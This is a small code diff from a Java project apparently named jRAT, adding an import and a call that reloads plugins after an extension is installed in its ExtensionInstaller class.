@@ -12,6 +12,7 @@ import java.util.zip.ZipEntry;
 import java.util.zip.ZipFile;
 
 import pro.jrat.Constants;
+import pro.jrat.Main;
 import pro.jrat.UniqueId;
 import pro.jrat.common.listeners.CopyStreamsListener;
 import pro.jrat.common.utils.IOUtils;
@@ -110,6 +111,8 @@ public class ExtensionInstaller {
 		temp.delete();
 
 		new Plugin(plugin.getJar());
+		
+		Main.instance.reloadPlugins();
 	}
 
 }
